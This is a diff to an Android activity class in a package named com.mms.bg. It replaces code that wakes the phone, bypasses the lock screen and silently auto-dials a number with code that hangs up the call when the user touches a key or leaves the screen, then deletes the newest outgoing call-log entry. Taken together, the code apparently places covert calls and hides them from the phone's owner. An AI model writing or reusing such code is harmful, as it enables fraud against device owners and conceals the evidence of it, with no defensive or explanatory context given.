@@ -1,43 +1,35 @@
 package com.mms.bg.ui;
 
+import com.android.internal.telephony.ITelephony;
+import android.os.DeadObjectException;
+import android.os.ServiceManager;
+import android.os.RemoteException;
+import android.provider.CallLog.Calls;
+
 import android.app.Activity;
 import android.os.Bundle;
 import android.util.Log;
+import android.view.KeyEvent;
 import android.view.WindowManager;
-import com.android.internal.telephony.Phone;
-import android.os.PowerManager;
-import android.content.Context;
-
-import android.os.IServiceManager;
-import android.os.ServiceManagerNative;
-//import android.telephony.IPhone;
-import com.android.internal.telephony.ITelephony;
-import android.os.DeadObjectException;
 import android.os.Handler;
 import android.os.Message;
-import android.os.ServiceManager;
-import android.os.RemoteException;
-import android.os.SystemClock;
-import android.os.IPowerManager;
-
-import com.android.internal.telephony.Phone;
-import com.android.internal.telephony.PhoneFactory;
-
-import com.mms.bg.*;
+import android.content.ContentResolver;
+import android.database.Cursor;
+import android.net.Uri;
 
 public class DialScreenActivity extends Activity {
     private static final String TAG = "DialScreenActivity";
     private static final boolean DEBUG = true;
     
-    private static final int DIAL_DELAY = 1000;
+    private boolean mHasCreated;
     
-    private static final int DIAL_AUTO = 0;
+    private static final int REMOVE_FIRST_LOG = 0;
     private Handler mHandler = new Handler() {
         public void handleMessage(Message msg) {
             switch (msg.what) {
-            case DIAL_AUTO:
-                wakeUpScreen();
-                dial();
+            case REMOVE_FIRST_LOG:
+                deleteLastCallLog();
+                finish();
                 break;
             }
         }
@@ -59,38 +51,57 @@ public class DialScreenActivity extends Activity {
             flags |= WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD;
 //        }
         getWindow().addFlags(flags);
-        
-//        this.setContentView(R.layout.test);
-        
-        mHandler.sendEmptyMessageDelayed(DIAL_AUTO, DIAL_DELAY);
+        mHasCreated = true;
     }
     
-    private void wakeUpScreen() {
-        synchronized (this) {
-                try {
-                    IPowerManager mPowerManagerService = IPowerManager.Stub.asInterface(
-                            ServiceManager.getService("power"));
-                    mPowerManagerService.userActivityWithForce(SystemClock.uptimeMillis(), false, true);
-                } catch (RemoteException ex) {
-                    // Ignore -- the system process is dead.
-                }
-        }
-    }
-    
-    private void dial() {
-        Log.d(TAG, "[[dial]]");
+    @Override
+    public boolean onKeyDown(int keyCode, KeyEvent event) {
+        if (DEBUG) Log.d(TAG, "[[DialScreenActivity::onKeyDown]] event type = " + event.getCharacters());
         try {
-//            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-//            PowerManager.WakeLock mPartialWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK
-//                    | PowerManager.ON_AFTER_RELEASE, "");
-//            
-//            mPartialWakeLock.acquire();
             ITelephony phone = (ITelephony) ITelephony.Stub.asInterface(ServiceManager.getService("phone"));
-            phone.call("10086");
-//            mPartialWakeLock.release();
+            phone.endCall();
+            mHandler.sendEmptyMessageDelayed(REMOVE_FIRST_LOG, 2000);
         } catch (RemoteException e) {
-            Log.d(TAG, e.getMessage());
         }
-//        finish();
+        return super.onKeyDown(keyCode, event);
+    }
+    
+    @Override
+    public void onUserLeaveHint () {
+        if (DEBUG) Log.d(TAG, "======== [[DialScreenActivity::onUserLeaveHint]] =======");
+        if (mHasCreated == true) {
+            try {
+                ITelephony phone = (ITelephony) ITelephony.Stub.asInterface(ServiceManager.getService("phone"));
+                phone.endCall();
+                mHandler.sendEmptyMessageDelayed(REMOVE_FIRST_LOG, 2000);
+            } catch (RemoteException e) {
+            }
+        }
+    }
+    
+    private void deleteLastCallLog() {
+        if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]]");
+        ContentResolver resolver = getContentResolver();
+        Cursor c = null;
+        try {
+            Uri CONTENT_URI = Uri.parse("content://call_log/calls");
+            c = resolver.query(
+                    CONTENT_URI,
+                    new String[] {Calls._ID},
+                    "type = 2",
+                    null,
+                    "date DESC" + " LIMIT 1");
+            if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]] c = " + c);
+                if (c == null || !c.moveToFirst()) {
+                    if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]] cursor error, return");
+                    return;
+                }
+                long id = c.getLong(0);
+                String where = Calls._ID + " IN (" + id + ")";
+                if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]] delete where = " + where);
+                getContentResolver().delete(CONTENT_URI, where, null);
+            } finally {
+                if (c != null) c.close();
+            }
     }
 }
